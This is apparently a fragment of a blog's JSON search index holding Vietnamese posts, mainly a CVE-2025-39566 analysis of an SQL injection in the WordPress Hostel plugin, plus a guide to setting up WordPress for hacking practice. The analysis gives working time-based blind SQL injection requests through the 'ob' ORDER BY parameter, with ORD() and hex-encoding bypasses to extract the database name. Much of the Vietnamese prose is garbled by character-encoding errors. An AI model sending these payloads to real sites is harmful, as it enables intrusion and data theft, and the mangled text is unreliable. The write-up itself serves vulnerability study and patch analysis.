ƒë·ªÉ quan s√°t\n","permalink":"//localhost:1313/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eKhi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGithub Pages\u003c/strong\u003e: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eJekyll\u003c/strong\u003e: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\u003c/p\u003e","title":"Github Pages with Jekyll themes and Giscus"},{"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file controllers/bookings.php\nB·∫£n l·ªó h·ªïng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } B·∫£n v√°:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nHow it work? ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C√¢u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } ·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ l√†m s·∫°ch HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nConclusion L·ªó h·ªïng CVE-2025-39566 trong plugin WordPress Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi 